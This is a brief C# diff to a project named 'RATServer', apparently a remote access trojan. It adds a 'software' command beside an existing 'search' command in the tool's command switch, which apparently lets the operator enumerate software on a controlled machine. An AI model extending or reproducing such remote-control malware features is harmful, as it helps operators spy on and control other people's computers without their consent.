@@ -98,6 +98,9 @@ namespace RATServer
                         case "search":
                             r = Functions.Search(c.Args[0]);
                             break;
+                        case "software":
+                            r = Functions.Software();
+                            break;
                         default:
                             break;
                     }                 
